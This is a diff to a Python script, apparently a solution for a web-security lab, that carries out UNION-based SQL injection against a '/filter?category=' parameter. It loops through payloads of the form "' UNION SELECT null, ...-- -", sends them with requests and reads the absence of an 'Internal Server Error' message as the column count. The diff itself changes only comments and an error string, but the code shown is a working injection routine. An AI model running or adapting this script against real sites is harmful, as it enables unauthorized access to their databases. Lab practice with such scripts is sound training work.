@@ -33,14 +33,15 @@ for i in range(1, 10):
         # number of nulls
         nulls = "null, " * i
         # payload to determine the number of columns
-        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -")
+        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
         print(Fore.WHITE + f"[*] Trying payload: {payload}")
         # fetch the page with the injected payload
         null_injection = requests.get(
             f"{url}/filter?category={payload}")
-        # extract the name of users table
+        # extract the error text
         internal_error = re.findall("<h4>Internal Server Error</h4>",
                                     null_injection.text)
+        # if the response is successful with no error text
         if len(internal_error) == 0:
             print(Fore.WHITE + "[#] Number of columns: " + Fore.GREEN + str(i))
             print(
@@ -50,4 +51,4 @@ for i in range(1, 10):
             continue
     except:
         print(Fore.RED +
-              "[!] Failed to inject the payload to retrieve the name of users table through exception")
+              "[!] Failed to inject the payload to determine the number of columns through exception")
